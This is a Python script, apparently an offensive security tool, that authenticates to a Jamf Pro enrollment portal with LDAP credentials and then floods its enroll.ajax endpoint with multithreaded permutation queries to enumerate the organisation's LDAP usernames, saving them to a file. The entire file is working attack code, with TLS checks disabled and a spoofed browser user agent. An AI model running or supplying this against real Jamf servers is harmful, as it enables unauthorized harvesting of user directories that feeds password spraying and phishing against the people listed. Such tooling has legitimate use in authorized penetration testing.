import requests
import argparse
import string
import sys
import time
from itertools import product
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed
from time import sleep
from urllib3.exceptions import InsecureRequestWarning
from multiprocessing.pool import ThreadPool as Pool

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

headers = {
    'Connection': 'close',
    'Cache-Control': 'max-age=0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
}

def print_debug(msg):
    if args.debug:
        print((bcolors.OKBLUE + "[%] %s" + bcolors.ENDC) % msg)
 
parser = argparse.ArgumentParser(description="Enumerates LDAP user objects when connected to Jamf.")
parser.add_argument('jss', help='URL of the JSS')
parser.add_argument('--username', nargs='?', default=None, help='Valid LDAP username')
parser.add_argument('--password', nargs='?', default=None, help='Valid LDAP password')
parser.add_argument('--threads', nargs='?', default=1, help='Number of threads to use (default=1)')
parser.add_argument('--query', nargs='?', default=None, help='Specific query to use instead of brute forcing all accounts.')
parser.add_argument('--depth', nargs='?', default=1, help='Length of permuations to generate (default=1)')
parser.add_argument('--output', nargs='?', default=None, help='File to output enumerated usernames')

args = parser.parse_args()

if "enroll" not in args.jss:
    if not args.jss.endswith("/"):
        args.jss += "/"

    args.jss += "enroll/"

ajax_url = args.jss + 'enroll.ajax'

if args.username is None:
    print("[!] Must supply either --username.")

if args.password is None:
    print("[!] Must supply either --password.")

print("[*] JSS Enrollment URL: %s" % args.jss)
print("[*] JSS Ajax URL: %s" % ajax_url)

try:
    s = requests.Session()
    r = s.get(args.jss, headers=headers, verify=False)

    if r.status_code == 200:
        print("[*] Status: " + bcolors.OKGREEN + "Up" + bcolors.ENDC)
        
    else:
        raise Exception("Initial checks returned HTTP status code: %i." % r.status_code)
except Exception as e:
    print("[!] Status: " + bcolors.FAIL + "Down or Unreachable" + bcolors.ENDC)
    print("[!] Error: %s" % e)
    sys.exit()


print("[*] Attempting authentication.")


data = 'lastPage=login.jsp&payload=&device-detect-complete=&username={}&password={}'.format(args.username, args.password)
s = requests.Session()
r = s.post(args.jss, headers=headers, data=data, verify=False, allow_redirects=False)

if r.status_code == 302:
    print("[*] Successful auth! Onwards.")
else:
    print("[!] Failed to authenticate... Exiting.")
    sys.exit()

confirmation = input("[?] Ready? [y/N] ")

if confirmation.lower() != "y":
    print("[!] " + bcolors.FAIL + "Aborting" + bcolors.ENDC)
    sys.exit()

headers = {
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
}

def parse_results(t):
    lines = t.splitlines()
    results = [x.replace("<user>","").replace("</user>","") for x in lines if "user" in x]
    return results

users = set()

def do_query(s, q):
    r = s.post(ajax_url, headers=headers, data="username={}".format(q), verify=False) 
    {users.add(u) for u in parse_results(r.text)} 

if args.query:
    print("[*] Querying '%s'." % (args.query))
    r = s.post(ajax_url, headers=headers, data="username={}".format(args.query), verify=False) 
    {users.add(u) for u in parse_results(r.text)} 
    print(users)
else:    
    print("[*] Querying the world.")
    query_set = product(string.ascii_lowercase + string.digits, repeat=int(args.depth))

    p = ThreadPoolExecutor(max_workers=int(args.threads))
    futures = []

    for q in query_set:
        futures.append(p.submit(do_query, s, ''.join(q)))

    for f in tqdm(as_completed(futures), leave=True, total=len(futures)):
        pass
   
    print("[*] Found %i users." % len(users))
    print(users)

if args.output:
    try:
        with open(args.output, 'w') as f:
           f.writelines([x + "\n" for x in list(users)])

        print("[*] Successfully wrote %i users to %s" % (len(users), args.output))
    except:
        print("[!] An error occured writing usernames to a file")


